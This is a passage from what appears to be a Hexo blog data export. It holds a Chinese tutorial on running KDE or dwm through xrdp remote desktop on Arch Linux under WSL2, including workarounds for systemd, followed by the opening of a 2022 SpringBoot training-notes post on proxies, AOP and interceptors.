title=\"必要软件\"></a>必要软件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 必要软件</span></span><br><span class=\"line\">yay -S xrdp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># （可选）xorgxrdp-glamor可以硬件加速，pulseaudio-module-xrdp实现声音重定向（wsl应该不需要）</span></span><br><span class=\"line\">yay -S xorgxrdp-glamor pulseaudio-module-xrdp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改配置文件</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;allowed_users=anybody&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/X11/Xwrapper.config</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># X窗口服务启动时自动运行桌面环境</span></span><br><span class=\"line\"><span class=\"comment\"># 将.xinitrc文件拷贝到用户目录下并修改</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /etc/X11/xinit/xinitrc ~/.xinitrc</span><br><span class=\"line\">vim ~/.xinitrc</span><br><span class=\"line\"><span class=\"comment\"># 注释掉.xinitrc最后几行</span></span><br><span class=\"line\"><span class=\"comment\"># twm &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># xclock -geometry 50x50-1+1 &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># xterm -geometry 80x50+494+51 &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># xterm -geometry 80x20+494-0 &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># exec xterm -geometry 80x66+0+0 -name login</span></span><br><span class=\"line\"><span class=\"comment\"># 1、若使用的是dwm，加上这句话</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> dwm</span><br><span class=\"line\"><span class=\"comment\"># 2、若使用的是kde，加上两个配置</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> DESKTOP_SESSION=plasma</span><br><span class=\"line\"><span class=\"built_in\">exec</span> /usr/lib/plasma-dbus-run-session-if-needed startplasma-x11</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 启动xrdp服务，wsl2直接使用systemctl会失败</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> xrdp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置修改\"><a href=\"#配置修改\" class=\"headerlink\" title=\"配置修改\"></a>配置修改</h2><p>wsl 使用直接使用远程桌面连接时可能会端口冲突，可修改 xrdp 默认的 3389 端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/xrdp/xrdp.ini</span><br><span class=\"line\"><span class=\"comment\"># 如将端口改成3390</span></span><br><span class=\"line\"><span class=\"comment\"># port=3390</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"wsl2-与-systemd-进程\"><a href=\"#wsl2-与-systemd-进程\" class=\"headerlink\" title=\"wsl2 与 systemd 进程\"></a>wsl2 与 systemd 进程</h1><h2 id=\"20221020\"><a href=\"#20221020\" class=\"headerlink\" title=\"20221020\"></a>20221020</h2><p><strong>wsl2 现已原生支持 systemd</strong>，目前需要 wsl 版本 <strong>0.67.6</strong> 及以上。</p>\n<p>方法：升级 wsl 版本后，通过以下命令建立 wsl.conf 文件并开启 systemd：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;[boot]\\nsystemd=true&quot;</span> | sudo <span class=\"built_in\">tee</span> -a /etc/wsl.conf</span><br></pre></td></tr></table></figure>\n\n<p>来源：<a href=\"https://www.cnblogs.com/wswind/p/wsl2-official-systemd.html\">WSL 2 上启用微软官方支持的 systemd</a></p>\n<h2 id=\"原来记录\"><a href=\"#原来记录\" class=\"headerlink\" title=\"原来记录\"></a>原来记录</h2><p>wsl2 本身是由 Windows 负责的，因此根进程不是 systemd，导致直接使用 <code>systemctl</code> 命令会失败。</p>\n<p>可以使用 <code>pstree</code> 查看到进程树。</p>\n<p>所以我们要安装 <code>daemonize</code> 软件并修改一下，使得我们的 wsl 系统能正常开启 systemd 服务。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 daemonize</span></span><br><span class=\"line\">sudo pacman -S daemonize</span><br><span class=\"line\"></span><br><span class=\"line\">sudo vim /etc/profile</span><br><span class=\"line\"><span class=\"comment\"># 文件/etc/profile末尾加入</span></span><br><span class=\"line\">SYSTEMD_PID=$(ps -ef | grep <span class=\"string\">&#x27;/lib/systemd/systemd --system-unit=basic.target$&#x27;</span> | grep -v unshare | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -z <span class=\"string\">&quot;<span class=\"variable\">$SYSTEMD_PID</span>&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  sudo /usr/sbin/daemonize /usr/bin/unshare --fork --pid --mount-proc /lib/systemd/systemd --system-unit=basic.target</span><br><span class=\"line\">  SYSTEMD_PID=$(ps -ef | grep <span class=\"string\">&#x27;/lib/systemd/systemd --system-unit=basic.target$&#x27;</span> | grep -v unshare | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -n <span class=\"string\">&quot;<span class=\"variable\">$SYSTEMD_PID</span>&quot;</span> ] &amp;&amp; [ <span class=\"string\">&quot;<span class=\"variable\">$SYSTEMD_PID</span>&quot;</span> != <span class=\"string\">&quot;1&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">exec</span> sudo /usr/bin/nsenter -t <span class=\"variable\">$SYSTEMD_PID</span> -a su - <span class=\"variable\">$LOGNAME</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n\n<p>wsl 重启后再使用 <code>pstree</code> 可以看到正常 systemd 服务正常启动了，<code>systemctl</code> 命令此时可以使用。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>我发现将 wsl 的 systemd 服务启动后，<code>systemctl</code> 命令正常，远程桌面也正常，目的算是达到了。但是由于 wsl 不是被 Windows 接管，所以本来的 wslg 不能正常使用了，点击程序不会弹出程序窗口，真是鱼与熊掌不可兼得。</p>\n<p>无奈下只能退回，毕竟对比起来远程桌面不是那么方便，还是 wslg 更舒服一点，这个桌面只能算是尝鲜吧。</p>\n<p>wsl 目前（2022&#x2F;05&#x2F;04）只能 100% 或 200% 整数倍缩放，我使用的是 4k 高分屏，Windows 使用的是 150%，wsl 会降级到 100%，导致字体很小，开启到 200% 缩放字是大了，但看起来字体发虚模糊，还是只能调整 gui 应用的字体大小。远程桌面下终端字体大小不知道为什么还调不了，属实是难受，也是我最终没有使用远程桌面这个方案的原因之一。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://www.cnblogs.com/huanhao/p/archlinuxdesktop.html\">【桌面篇】Archlinux 安装 kde 桌面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/112536524\">从零开始配置自己的 Arch Linux 桌面（极简）</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_44335269/article/details/117886927\">Arch Linux 下安装 dwm (平铺式窗口管理器)</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/183861786\">入坑 dwm——原来窗口管理器还可以这样用？！</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/408552473\">简单配置窗口管理器（dwm）</a></li>\n<li><a href=\"https://www.cnblogs.com/lanuage/p/15970577.html\">dwm 美化</a></li>\n<li><a href=\"https://alvin.red/2021/11/06/archlinux-xrdp/\">配置 Xrdp - 通过 RDP 连接 Arch Linux KDE 远程桌面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/149501381\">WSL2 使用 xrdp 实现图形桌面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/335162006\">WSL2 的 Linux 中运行 systemctl 命令</a></li>\n<li><a href=\"https://www.cnblogs.com/MorStar/p/15078738.html\">WSL2 Ubuntu 永久开启 systemctl 命令的简单方法</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>这一次尝试一下在 wsl2 安装桌面环境并使用远程桌面连接使用，此篇文章作为记录。</p>","more":"<h1 id=\"桌面安装\"><a href=\"#桌面安装\" class=\"headerlink\" title=\"桌面安装\"></a>桌面安装</h1><h2 id=\"先安装-xorg-桌面环境\"><a href=\"#先安装-xorg-桌面环境\" class=\"headerlink\" title=\"先安装 xorg 桌面环境\"></a>先安装 xorg 桌面环境</h2><p>linux 桌面很多都是 x 窗口的实现，基础服务，必装。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># xorg，将安装xorg-server，键盘驱动、鼠标驱动、显卡驱动等，若没有显卡驱动导致失败请自行安装适宜的显卡驱动</span></span><br><span class=\"line\"><span class=\"comment\"># xorg-xinit，xorg初始化程序，提供了 xinit、startx 和默认的 xinitrc 文件</span></span><br><span class=\"line\">sudo pacman -S xorg xorg-xinit</span><br></pre></td></tr></table></figure>\n\n<p>安装后请自行选择喜欢的桌面环境</p>\n<h2 id=\"KDE-桌面\"><a href=\"#KDE-桌面\" class=\"headerlink\" title=\"KDE 桌面\"></a>KDE 桌面</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># kde plasma 桌面</span></span><br><span class=\"line\">sudo pacman -S plasma</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># （可选）KDE应用和SDDM图形登录界面</span></span><br><span class=\"line\">sudo pacman -S kde-applications</span><br><span class=\"line\">sudo pacman -S sddm sddm-kcm</span><br><span class=\"line\"><span class=\"comment\"># 启动SSDM登录界面服务，注意到wsl会无法找到这个命令，下文会涉及到</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> sddm</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"DWM-桌面\"><a href=\"#DWM-桌面\" class=\"headerlink\" title=\"DWM 桌面\"></a>DWM 桌面</h2><p>这次也尝试一下平铺式桌面，没那么多花里胡哨的，想要花里胡哨也可以自定义，可以说是非常自由了。</p>\n<p>我这次选择尝试的是 DWM。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆dwm源码</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://git.suckless.org/dwm</span><br><span class=\"line\"><span class=\"built_in\">cd</span> dwm/</span><br><span class=\"line\"><span class=\"comment\"># 修改config.mk文件</span></span><br><span class=\"line\">vim config.mk</span><br><span class=\"line\"><span class=\"comment\"># X11INC = /usr/X11R6/include -&gt;  X11INC = /usr/include/X11</span></span><br><span class=\"line\"><span class=\"comment\"># X11LIB = /usr/X11R6/lib  -&gt;  X11LIB = /usr/lib/X11</span></span><br><span class=\"line\"><span class=\"comment\"># 编译安装</span></span><br><span class=\"line\">sudo make clean install</span><br><span class=\"line\"><span class=\"comment\"># X窗口服务启动时自动运行dwm窗口管理器</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">exec</span> dwm &gt;&gt; ~/.xinitrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 默认使用的终端模拟器是st</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://git.suckless.org/st</span><br><span class=\"line\"><span class=\"built_in\">cd</span> st/</span><br><span class=\"line\"><span class=\"comment\"># 修改config.mk文件</span></span><br><span class=\"line\">vim config.mk</span><br><span class=\"line\"><span class=\"comment\"># X11INC = /usr/X11R6/include -&gt;  X11INC = /usr/include/X11</span></span><br><span class=\"line\"><span class=\"comment\"># X11LIB = /usr/X11R6/lib  -&gt;  X11LIB = /usr/lib/X11</span></span><br><span class=\"line\"><span class=\"comment\"># 编译安装</span></span><br><span class=\"line\">sudo make clean install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 默认的程序启动器是dmenu</span></span><br><span class=\"line\">sudo pacman -S dmenu</span><br></pre></td></tr></table></figure>\n\n<p>若安装完毕，可 <code>shift+alt+enter</code> 打开 st 终端， <code>alt+p</code> 打开 dmenu 并输入程序名称打开程序。</p>\n<p>这些快捷键和终端模拟器、程序启动器可在 dwm 源码的 config.def.h 中修改，注意每次修改完都要重新编译安装一次。</p>\n<p>ps：尝试过安装 alacritty 终端和 rofi 启动器，但好像在 wsl 中不生效，只有 suckless 公司的三件套合在一起才正常，可能是我 config.def.h 修改的不正确，不管了。</p>\n<h1 id=\"Xrdp-安装\"><a href=\"#Xrdp-安装\" class=\"headerlink\" title=\"Xrdp 安装\"></a>Xrdp 安装</h1><p>我们的目的是使用 Windows 远程桌面连接 wsl，所以需要安装配置 Xrdp。</p>\n<h2 id=\"必要软件\"><a href=\"#必要软件\" class=\"headerlink\" title=\"必要软件\"></a>必要软件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 必要软件</span></span><br><span class=\"line\">yay -S xrdp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># （可选）xorgxrdp-glamor可以硬件加速，pulseaudio-module-xrdp实现声音重定向（wsl应该不需要）</span></span><br><span class=\"line\">yay -S xorgxrdp-glamor pulseaudio-module-xrdp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改配置文件</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;allowed_users=anybody&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/X11/Xwrapper.config</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># X窗口服务启动时自动运行桌面环境</span></span><br><span class=\"line\"><span class=\"comment\"># 将.xinitrc文件拷贝到用户目录下并修改</span></span><br><span class=\"line\"><span class=\"built_in\">cp</span> /etc/X11/xinit/xinitrc ~/.xinitrc</span><br><span class=\"line\">vim ~/.xinitrc</span><br><span class=\"line\"><span class=\"comment\"># 注释掉.xinitrc最后几行</span></span><br><span class=\"line\"><span class=\"comment\"># twm &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># xclock -geometry 50x50-1+1 &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># xterm -geometry 80x50+494+51 &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># xterm -geometry 80x20+494-0 &amp;</span></span><br><span class=\"line\"><span class=\"comment\"># exec xterm -geometry 80x66+0+0 -name login</span></span><br><span class=\"line\"><span class=\"comment\"># 1、若使用的是dwm，加上这句话</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> dwm</span><br><span class=\"line\"><span class=\"comment\"># 2、若使用的是kde，加上两个配置</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> DESKTOP_SESSION=plasma</span><br><span class=\"line\"><span class=\"built_in\">exec</span> /usr/lib/plasma-dbus-run-session-if-needed startplasma-x11</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 启动xrdp服务，wsl2直接使用systemctl会失败</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> xrdp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置修改\"><a href=\"#配置修改\" class=\"headerlink\" title=\"配置修改\"></a>配置修改</h2><p>wsl 使用直接使用远程桌面连接时可能会端口冲突，可修改 xrdp 默认的 3389 端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/xrdp/xrdp.ini</span><br><span class=\"line\"><span class=\"comment\"># 如将端口改成3390</span></span><br><span class=\"line\"><span class=\"comment\"># port=3390</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"wsl2-与-systemd-进程\"><a href=\"#wsl2-与-systemd-进程\" class=\"headerlink\" title=\"wsl2 与 systemd 进程\"></a>wsl2 与 systemd 进程</h1><h2 id=\"20221020\"><a href=\"#20221020\" class=\"headerlink\" title=\"20221020\"></a>20221020</h2><p><strong>wsl2 现已原生支持 systemd</strong>，目前需要 wsl 版本 <strong>0.67.6</strong> 及以上。</p>\n<p>方法：升级 wsl 版本后，通过以下命令建立 wsl.conf 文件并开启 systemd：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;[boot]\\nsystemd=true&quot;</span> | sudo <span class=\"built_in\">tee</span> -a /etc/wsl.conf</span><br></pre></td></tr></table></figure>\n\n<p>来源：<a href=\"https://www.cnblogs.com/wswind/p/wsl2-official-systemd.html\">WSL 2 上启用微软官方支持的 systemd</a></p>\n<h2 id=\"原来记录\"><a href=\"#原来记录\" class=\"headerlink\" title=\"原来记录\"></a>原来记录</h2><p>wsl2 本身是由 Windows 负责的，因此根进程不是 systemd，导致直接使用 <code>systemctl</code> 命令会失败。</p>\n<p>可以使用 <code>pstree</code> 查看到进程树。</p>\n<p>所以我们要安装 <code>daemonize</code> 软件并修改一下，使得我们的 wsl 系统能正常开启 systemd 服务。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 daemonize</span></span><br><span class=\"line\">sudo pacman -S daemonize</span><br><span class=\"line\"></span><br><span class=\"line\">sudo vim /etc/profile</span><br><span class=\"line\"><span class=\"comment\"># 文件/etc/profile末尾加入</span></span><br><span class=\"line\">SYSTEMD_PID=$(ps -ef | grep <span class=\"string\">&#x27;/lib/systemd/systemd --system-unit=basic.target$&#x27;</span> | grep -v unshare | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -z <span class=\"string\">&quot;<span class=\"variable\">$SYSTEMD_PID</span>&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  sudo /usr/sbin/daemonize /usr/bin/unshare --fork --pid --mount-proc /lib/systemd/systemd --system-unit=basic.target</span><br><span class=\"line\">  SYSTEMD_PID=$(ps -ef | grep <span class=\"string\">&#x27;/lib/systemd/systemd --system-unit=basic.target$&#x27;</span> | grep -v unshare | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -n <span class=\"string\">&quot;<span class=\"variable\">$SYSTEMD_PID</span>&quot;</span> ] &amp;&amp; [ <span class=\"string\">&quot;<span class=\"variable\">$SYSTEMD_PID</span>&quot;</span> != <span class=\"string\">&quot;1&quot;</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">exec</span> sudo /usr/bin/nsenter -t <span class=\"variable\">$SYSTEMD_PID</span> -a su - <span class=\"variable\">$LOGNAME</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n\n<p>wsl 重启后再使用 <code>pstree</code> 可以看到正常 systemd 服务正常启动了，<code>systemctl</code> 命令此时可以使用。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>我发现将 wsl 的 systemd 服务启动后，<code>systemctl</code> 命令正常，远程桌面也正常，目的算是达到了。但是由于 wsl 不是被 Windows 接管，所以本来的 wslg 不能正常使用了，点击程序不会弹出程序窗口，真是鱼与熊掌不可兼得。</p>\n<p>无奈下只能退回，毕竟对比起来远程桌面不是那么方便，还是 wslg 更舒服一点，这个桌面只能算是尝鲜吧。</p>\n<p>wsl 目前（2022&#x2F;05&#x2F;04）只能 100% 或 200% 整数倍缩放，我使用的是 4k 高分屏，Windows 使用的是 150%，wsl 会降级到 100%，导致字体很小，开启到 200% 缩放字是大了，但看起来字体发虚模糊，还是只能调整 gui 应用的字体大小。远程桌面下终端字体大小不知道为什么还调不了，属实是难受，也是我最终没有使用远程桌面这个方案的原因之一。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://www.cnblogs.com/huanhao/p/archlinuxdesktop.html\">【桌面篇】Archlinux 安装 kde 桌面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/112536524\">从零开始配置自己的 Arch Linux 桌面（极简）</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_44335269/article/details/117886927\">Arch Linux 下安装 dwm (平铺式窗口管理器)</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/183861786\">入坑 dwm——原来窗口管理器还可以这样用？！</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/408552473\">简单配置窗口管理器（dwm）</a></li>\n<li><a href=\"https://www.cnblogs.com/lanuage/p/15970577.html\">dwm 美化</a></li>\n<li><a href=\"https://alvin.red/2021/11/06/archlinux-xrdp/\">配置 Xrdp - 通过 RDP 连接 Arch Linux KDE 远程桌面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/149501381\">WSL2 使用 xrdp 实现图形桌面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/335162006\">WSL2 的 Linux 中运行 systemctl 命令</a></li>\n<li><a href=\"https://www.cnblogs.com/MorStar/p/15078738.html\">WSL2 Ubuntu 永久开启 systemctl 命令的简单方法</a></li>\n</ul>"},{"layout":"pages","title":"SpringBoot培训2022","date":"2022-09-16T02:15:12.000Z","_content":"\n2022 年 SpringBoot 培训记录。\n\n<!--more-->\n\n# Spring 核心原理\n\n## 简化开发的几个策略\n\n1. 基于 pojo 的轻量级和最小侵入性编程\n2. 通过依赖注入和面向接口松耦合\n3. 基于切面和注解进行声明式编程\n4. 通过切面和模版减少样板式代码\n\n## 代理模式\n\n将被代理类包装起来然后重新实现相同的方法，并且调用原来方法的同时可以在方法前后添加一个新的处理。\n\n- 这种代理模式可以使用继承或组合来使用，当调用时需要使用的是代理类的对象。\n- 通过继承被代理对象，重写被代理类方法，可以对其进行代理，被代理类无需实现接口。\n- 被代理类和代理类都需要实现相同接口，被代理类作为代理类的组合属性成员传入。\n- 静态代理：静态编码定义代理类。\n- 动态代理：动态生成代理类。使用反射和字节码，在运行期间创建指定接口或类的子类以及它的实例对象的一项技术，通过此技术可以对代码进行无侵入式的增强。\n  - **JDK 动态代理**：java.lang.reflect 包中的 Proxy 类和 InvocationHandler 接口提供了生成动态代理类的能力。\n  - **CGLIB 动态代理**：第三方代码生成类库，运行时在内存中动态生成一个子类对象（通过继承方式）从而实现对目标对象功能的拓展。\n\n## Bean 的拓展接口\n\n- BeanPostProcessor：Bean 级别、针对具体的 Bean 进行处理，默认对 Spring 容器的所有 Bean 进行处理。\n- BeanFactoryPostProcessor：对 BeanDefinition 对象进行修改，针对 Bean 容器，在当前 BeanFactory 初始化后、Bean 实例化之前修改 Bean 的定义属性。\n\n# 面向切面 AOP\n\n面向切面编程（AOP）通过提供另一种思考程序结构的方式来补充面向对象编程（OOP）。\n\nOOP 中模块化的关键单元是类，AOP 中模块化的单元是切面。\n\n切面支持跨多种类型和对象的关注点（例如事务管理）的模块化。\n\nSpring IOC 容器不依赖 AOP，AOP 补充了 Spring IOC 以提供非常强大的中间件解决方案。\n\n## 顺序问题\n\n- 从 Spring Framework 5.2.7 开始，同一个切面类中定义的需要在同一个连接点运行的通知方法根据通知类型的优先级由高到低排序：@Around，@Before，@After，@AfterRunning，@AfterThrowing。\n- 当同一个类中定义两条相同类型的 Advice 时，执行顺序是未定义的（不应该有多条相同的 Advice）。\n- 不同切面类可以通过 Order 决定顺序，值越小优先级越高。\n\n# 拦截器\n\nSpring MVC 可以使用拦截器对请求进行拦截处理，用户可以自定义拦截器实现特定功能，自定义拦截器必须实现 HandlerInterceptor 接口。\n\n拦截器方法执行顺序：\n\npreHandle -> handle -> postHandle -> render -> afterCompletion\n","source":"_posts/2022/09/SpringBoot培训2022.md","raw":"---\nlayout: pages\ntitle: SpringBoot培训2022\ndate: 2022-09-16 10:15:12\ntags:\n  - 培训\n  - Java\n  - SpringBoot\ncategories:\n  - 培训\n  - SpringBoot\n---\n\n2022 年 SpringBoot 培训记录。\n\n<!--more-->\n\n# Spring 核心原理\n\n## 简化开发的几个策略\n\n1. 基于 pojo 的轻量级和最小侵入性编程\n2. 通过依赖注入和面向接口松耦合\n3. 基于切面和注解进行声明式编程\n4. 通过切面和模版减少样板式代码\n\n## 代理模式\n\n将被代理类包装起来然后重新实现相同的方法，并且调用原来方法的同时可以在方法前后添加一个新的处理。\n\n- 这种代理模式可以使用继承或组合来使用，当调用时需要使用的是代理类的对象。\n- 通过继承被代理对象，重写被代理类方法，可以对其进行代理，被代理类无需实现接口。\n- 被代理类和代理类都需要实现相同接口，被代理类作为代理类的组合属性成员传入。\n- 静态代理：静态编码定义代理类。\n- 动态代理：动态生成代理类。使用反射和字节码，在运行期间创建指定接口或类的子类以及它的实例对象的一项技术，通过此技术可以对代码进行无侵入式的增强。\n  - **JDK 动态代理**：java.lang.reflect 包中的 Proxy 类和 InvocationHandler 接口提供了生成动态代理类的能力。\n  - **CGLIB 动态代理**：第三方代码生成类库，运行时在内存中动态生成一个子类对象（通过继承方式）从而实现对目标对象功能的拓展。\n\n## Bean 的拓展接口\n\n- BeanPostProcessor：Bean 级别、针对具体的 Bean 进行处理，默认对 Spring 容器的所有 Bean 进行处理。\n- BeanFactoryPostProcessor：对 BeanDefinition 对象进行修改，针对 Bean 容器，在当前 BeanFactory 初始化后、Bean 实例化之前修改 Bean 的定义属性。\n\n# 面向切面 AOP\n\n面向切面编程（AOP）通过提供另一种思考程序结构的方式来补充面向对象编程（OOP）。\n\nOOP 中模块化的关键单元是类，AOP 